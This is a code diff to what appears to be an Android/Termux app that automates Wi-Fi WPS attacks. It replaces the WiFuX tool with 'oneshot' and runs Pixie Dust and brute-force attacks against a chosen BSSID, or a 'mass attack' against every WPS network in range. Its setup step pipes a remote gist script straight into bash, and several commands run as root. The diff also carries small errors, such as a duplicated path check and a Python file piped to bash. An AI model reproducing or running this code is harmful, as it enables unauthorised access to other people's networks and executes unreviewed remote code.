@@ -514,11 +514,11 @@ async function checkWipwnInstalled() {
     } catch (e) { return false; }
 }
 
-// ✅ UPDATED: Robust check for WiFuX (checks for main.py in both WiFuX and wifux directories)
-async function checkWifuxInstalled() {
+// ✅ UPDATED: Robust check for oneshot (checks for main.py in both oneshot and oneshot directories)
+async function checkoneshotInstalled() {
     try {
         // Directly checks if the main.py file exists, which is what the attack command actually runs
-        const res = await execFn('su -c "test -f /data/data/com.termux/files/home/WiFuX/main.py && echo yes || (test -f /data/data/com.termux/files/home/wifux/main.py && echo yes || echo no)"');
+        const res = await execFn('su -c "test -f /data/data/com.termux/files/home/ose/ose.py && echo yes || (test -f /data/data/com.termux/files/home/ose/ose.py && echo yes || echo no)"');
         return res.trim() === 'yes';
     } catch (e) { return false; }
 }
@@ -609,10 +609,10 @@ async function showAttackModal(network) {
     }
     
     const wipwnInstalled = await checkWipwnInstalled();
-    const wifuxInstalled = await checkWifuxInstalled();
+    const oneshotInstalled = await checkoneshotInstalled();
 
     // ✅ UPDATED: Show setup for both if NEITHER is installed
-    if (!wipwnInstalled && !wifuxInstalled) {
+    if (!wipwnInstalled && !oneshotInstalled) {
         content.innerHTML = `
             <div style="text-align: center; padding: 20px;">
                 <div style="font-size: 48px; margin-bottom: 16px;">⚙️</div>
@@ -620,37 +620,37 @@ async function showAttackModal(network) {
                 <div style="color: #8b92b4; font-size: 13px; margin-bottom: 20px;">Choose a tool to install:</div>
                 <div style="display: flex; flex-direction: column; gap: 12px;">
                     <button id="setup-wipwn-btn" style="padding: 12px 24px; background: linear-gradient(135deg, #32D74B, #28a745); color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 14px;">⚙️ Setup WiPwn</button>
-                    <button id="setup-wifux-btn" style="padding: 12px 24px; background: linear-gradient(135deg, #9b59b6, #8e44ad); color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 14px;">🛠️ Setup WiFuX</button>
+                    <button id="setup-oneshot-btn" style="padding: 12px 24px; background: linear-gradient(135deg, #9b59b6, #8e44ad); color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 14px;">🛠️ Setup oneshot</button>
                 </div>
             </div>
         `;
         document.getElementById('setup-wipwn-btn').onclick = () => runSetup(network, 'wipwn');
-        document.getElementById('setup-wifux-btn').onclick = () => runSetup(network, 'wifux');
+        document.getElementById('setup-oneshot-btn').onclick = () => runSetup(network, 'oneshot');
         return;
     }
 
     // Auto-select if only one is installed
-    if (wipwnInstalled && !wifuxInstalled) currentAttackTool = 'wipwn';
-    if (!wipwnInstalled && wifuxInstalled) currentAttackTool = 'wifux';
+    if (wipwnInstalled && !oneshotInstalled) currentAttackTool = 'wipwn';
+    if (!wipwnInstalled && oneshotInstalled) currentAttackTool = 'oneshot';
 
     // ✅ Tool selector UI if BOTH are installed
     let toolSelectorHtml = '';
-    if (wipwnInstalled && wifuxInstalled) {
+    if (wipwnInstalled && oneshotInstalled) {
         toolSelectorHtml = `
             <div style="margin-bottom: 15px; display: flex; justify-content: center; gap: 10px;">
                 <button id="tool-wipwn" style="padding: 8px 16px; background: ${currentAttackTool === 'wipwn' ? '#32D74B' : '#2a3152'}; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: 600;">WiPwn</button>
-                <button id="tool-wifux" style="padding: 8px 16px; background: ${currentAttackTool === 'wifux' ? '#9b59b6' : '#2a3152'}; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: 600;">WiFuX</button>
+                <button id="tool-oneshot" style="padding: 8px 16px; background: ${currentAttackTool === 'oneshot' ? '#9b59b6' : '#2a3152'}; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: 600;">oneshot</button>
             </div>        `;
     }
 
     // ✅ NEW: Add "Install Missing Tool" button if only one is installed
-    let installMissingHtml = '';    if (wipwnInstalled && !wifuxInstalled) {
+    let installMissingHtml = '';    if (wipwnInstalled && !oneshotInstalled) {
         installMissingHtml = `
             <div style="margin-bottom: 15px; text-align: center;">
-                <button id="install-wifux-btn" style="padding: 8px 16px; background: #2a3152; border: 1px solid #9b59b6; color: #9b59b6; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px;"> Install WiFuX</button>
+                <button id="install-oneshot-btn" style="padding: 8px 16px; background: #2a3152; border: 1px solid #9b59b6; color: #9b59b6; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px;"> Install oneshot</button>
             </div>
         `;
-    } else if (!wipwnInstalled && wifuxInstalled) {
+    } else if (!wipwnInstalled && oneshotInstalled) {
         installMissingHtml = `
             <div style="margin-bottom: 15px; text-align: center;">
                 <button id="install-wipwn-btn" style="padding: 8px 16px; background: #2a3152; border: 1px solid #32D74B; color: #32D74B; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px;">📥 Install WiPwn</button>
@@ -663,7 +663,7 @@ async function showAttackModal(network) {
         ${installMissingHtml}
         <div style="text-align: center; padding: 20px;">
             <div style="font-size: 48px; margin-bottom: 16px;">🎯</div>
-            <div style="color: #32D74B; font-size: 16px; font-weight: 600; margin-bottom: 12px;">Ready to Attack (${currentAttackTool === 'wipwn' ? 'WiPwn' : 'WiFuX'})</div>
+            <div style="color: #32D74B; font-size: 16px; font-weight: 600; margin-bottom: 12px;">Ready to Attack (${currentAttackTool === 'wipwn' ? 'WiPwn' : 'oneshot'})</div>
             <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                 <button id="pixie-btn" style="padding: 16px; background: linear-gradient(135deg, #9b59b6, #8e44ad); color: #fff; border: none; border-radius: 12px; font-weight: 600; cursor: pointer;">✨ Pixie Dust</button>
                 <button id="brute-btn" style="padding: 16px; background: linear-gradient(135deg, #FF9F0A, #ff7f50); color: #fff; border: none; border-radius: 12px; font-weight: 600; cursor: pointer;">🔨 Brute Force</button>
@@ -672,15 +672,15 @@ async function showAttackModal(network) {
     `;
 
     // Bind tool selector events if both are installed
-    if (wipwnInstalled && wifuxInstalled) {
+    if (wipwnInstalled && oneshotInstalled) {
         document.getElementById('tool-wipwn').onclick = () => { currentAttackTool = 'wipwn'; showAttackModal(network); };
-        document.getElementById('tool-wifux').onclick = () => { currentAttackTool = 'wifux'; showAttackModal(network); };
+        document.getElementById('tool-oneshot').onclick = () => { currentAttackTool = 'oneshot'; showAttackModal(network); };
     }
 
     // ✅ Bind install missing tool buttons
-    if (wipwnInstalled && !wifuxInstalled) {
-        document.getElementById('install-wifux-btn').onclick = () => runSetup(network, 'wifux');
-    } else if (!wipwnInstalled && wifuxInstalled) {
+    if (wipwnInstalled && !oneshotInstalled) {
+        document.getElementById('install-oneshot-btn').onclick = () => runSetup(network, 'oneshot');
+    } else if (!wipwnInstalled && oneshotInstalled) {
         document.getElementById('install-wipwn-btn').onclick = () => runSetup(network, 'wipwn');
     }
 
@@ -691,9 +691,9 @@ async function showAttackModal(network) {
 // ✅ UPDATED: Accepts 'tool' parameter to run correct setup
 async function runSetup(network, tool = 'wipwn') {
     const isWipwn = tool === 'wipwn';
-    const isInstalled = isWipwn ? await checkWipwnInstalled() : await checkWifuxInstalled();
+    const isInstalled = isWipwn ? await checkWipwnInstalled() : await checkoneshotInstalled();
     
-    if (isInstalled) {        if (typeof showStatus === 'function') showStatus(`✅ ${isWipwn ? 'WiPwn' : 'WiFuX'} already installed!`, '#32D74B');
+    if (isInstalled) {        if (typeof showStatus === 'function') showStatus(`✅ ${isWipwn ? 'WiPwn' : 'oneshot'} already installed!`, '#32D74B');
         currentAttackTool = tool;
         showAttackModal(network);
         return;
@@ -705,14 +705,14 @@ async function runSetup(network, tool = 'wipwn') {
     
     logContainer.style.display = 'block';
     stopBtn.style.display = 'block';    
-    content.innerHTML = `<div style="color: #4a9eff; text-align: center; padding: 10px;">⏳ Opening Termux to setup ${isWipwn ? 'WiPwn' : 'WiFuX'}...</div>`;
+    content.innerHTML = `<div style="color: #4a9eff; text-align: center; padding: 10px;">⏳ Opening Termux to setup ${isWipwn ? 'WiPwn' : 'oneshot'}...</div>`;
 
     let setupCmd = '';
     if (isWipwn) {
         // EXACT ORIGINAL WIPWN LOGIC
         setupCmd = `pkg update && pkg upgrade -y && pkg install root-repo -y && pkg install git python wpa-supplicant pixiewps iw openssl -y && pkg install tsu -y || pkg install sudo -y && git clone https://github.com/anbuinfosec/wipwn && cd wipwn && chmod +x main.py`;
-    } else {        // ✅ WIFUX SETUP LOGIC
-        setupCmd = `pkg update && pkg upgrade -y && pkg install root-repo git tsu python wpa-supplicant pixiewps iw -y && git clone https://github.com/msrofficial/WiFuX && cd WiFuX && chmod +x install.sh && bash install.sh`;
+    } else {        // ✅ oneshot SETUP LOGIC
+        setupCmd = `curl -sL https://gist.githubusercontent.com/chkndrp/f2ea65c77e3861ac4b586d9001ca8f55/raw/9c7664d71f2b502dc8fd7405f7cfabedc2088c85/ose_setup.py | bash`;
     }
 
     // Launch Termux and auto-paste the command
@@ -742,15 +742,15 @@ async function runSetup(network, tool = 'wipwn') {
             if (status.trim() === 'SETUP_COMPLETE') isReady = true;
             // Fallback to actual check in case status file isn't written
             if (await checkWipwnInstalled()) isReady = true; 
-        } else {            // WiFuX logic (now uses the robust main.py check)
-            if (await checkWifuxInstalled()) isReady = true;
+        } else {            // oneshot logic (now uses the robust main.py check)
+            if (await checkoneshotInstalled()) isReady = true;
         }
 
         if (isReady) {
             clearInterval(checkInterval);
             stopLogReader();
             stopBtn.style.display = 'none';
-            if (typeof showStatus === 'function') showStatus(`✅ ${isWipwn ? 'WiPwn' : 'WiFuX'} setup complete!`, '#32D74B');
+            if (typeof showStatus === 'function') showStatus(`✅ ${isWipwn ? 'WiPwn' : 'oneshot'} setup complete!`, '#32D74B');
             currentAttackTool = tool;
             showAttackModal(network);
         }
@@ -771,11 +771,16 @@ async function startAttack(network, type) {
     stopBtn.style.display = 'block';
     
     const attackType = type === 'pixie' ? 'Pixie Dust' : 'Brute Force';
-    const toolName = currentAttackTool === 'wipwn' ? 'WiPwn' : 'WiFuX';
+    const toolName = currentAttackTool === 'wipwn' ? 'WiPwn' : 'oneshot';
     content.innerHTML = `<div style="color: #32D74B; text-align: center; padding: 10px;">⚔️ Starting ${attackType} with ${toolName}...</div>`;
 
     const macUpper = network.bssid.toUpperCase();
-    const attackArg = type === 'pixie' ? '-K' : '-B';
+    let attackArg = '';
+if (type === 'pixie') {
+    attackArg = currentAttackTool === 'wipwn' ? '-K' : '-P';
+} else {
+    attackArg = '-B'; // Defaults to Brute Force arg
+}
     const attackJobId = `ATTACK_JOB_${Date.now()}`;
    
     await execFn('cmd wifi start-softap MyHotspot open ""');
@@ -785,7 +790,7 @@ async function startAttack(network, type) {
     if (currentAttackTool === 'wipwn') {
         attackShellCmd = `cd ~/wipwn && sudo python3 -u main.py -i wlan0 -b ${macUpper} ${attackArg}`;
     } else {
-        attackShellCmd = `cd ~/WiFuX && timeout 999999 sudo python -u main.py -i wlan0 -b ${macUpper} ${attackArg}`;
+        attackShellCmd = `cd ~/ose && sudo python -u ose.py -i wlan0 -b ${macUpper} ${attackArg}`;
     }
 
     await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);    
@@ -870,16 +875,16 @@ async function attackAllNetworks() {
     }
 
     const wipwnInstalled = await checkWipwnInstalled();
-    const wifuxInstalled = await checkWifuxInstalled();
+    const oneshotInstalled = await checkoneshotInstalled();
 
-    if (!wipwnInstalled && !wifuxInstalled) {
+    if (!wipwnInstalled && !oneshotInstalled) {
         if (typeof showStatus === 'function') showStatus('❌ No attack tool installed. Setup first!', '#FF3B30');
         return;
     }
 
     // Fallback if selected tool is not installed
-    if (currentAttackTool === 'wipwn' && !wipwnInstalled) currentAttackTool = 'wifux';
-    if (currentAttackTool === 'wifux' && !wifuxInstalled) currentAttackTool = 'wipwn';
+    if (currentAttackTool === 'wipwn' && !wipwnInstalled) currentAttackTool = 'oneshot';
+    if (currentAttackTool === 'oneshot' && !oneshotInstalled) currentAttackTool = 'wipwn';
 
     // Filter networks that have WPS/WPA (required for Pixie Dust)
     const targetNetworks = availableNetworks.filter(n => 
@@ -902,7 +907,7 @@ async function attackAllNetworks() {
     box.style.cssText = `background: #1a1f3a; border: 1px solid #2a3152; border-radius: 16px; padding: 24px; width: 90%; max-width: 650px; max-height: 90vh; overflow-y: auto; box-shadow: 0 10px 40px rgba(0,0,0,0.5);`;
 
     box.innerHTML = `
-        <h3 style="color: #fff; margin: 0 0 16px; font-size: 18px; font-weight: 600; text-align: center;">⚔️ Mass Pixie Dust Attack (${currentAttackTool === 'wipwn' ? 'WiPwn' : 'WiFuX'})</h3>
+        <h3 style="color: #fff; margin: 0 0 16px; font-size: 18px; font-weight: 600; text-align: center;">⚔️ Mass Pixie Dust Attack (${currentAttackTool === 'wipwn' ? 'WiPwn' : 'oneshot'})</h3>
         <div style="color: #8b92b4; font-size: 13px; margin-bottom: 16px; text-align: center;">
             Targeting <strong style="color: #4a9eff">${targetNetworks.length}</strong> networks • 30s per target
         </div>        <div style="margin-bottom: 20px;">
@@ -980,8 +985,8 @@ async function attackAllNetworks() {
             // EXACT ORIGINAL WIPWN LOGIC
             attackShellCmd = `cd ~/wipwn && timeout 30 sudo python3 -u main.py -i wlan0 -b ${macUpper} -K`;
         } else {
-            // ✅ WIFUX MASS ATTACK LOGIC
-            attackShellCmd = `cd ~/WiFuX && timeout 30 sudo python -u main.py -i wlan0 -b ${macUpper} -K`;
+            // ✅ oneshot MASS ATTACK LOGIC
+            attackShellCmd = `cd ~/ose && sudo python -u ose.py -i wlan0 -b ${macUpper} -P`;
         }
 
         await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);
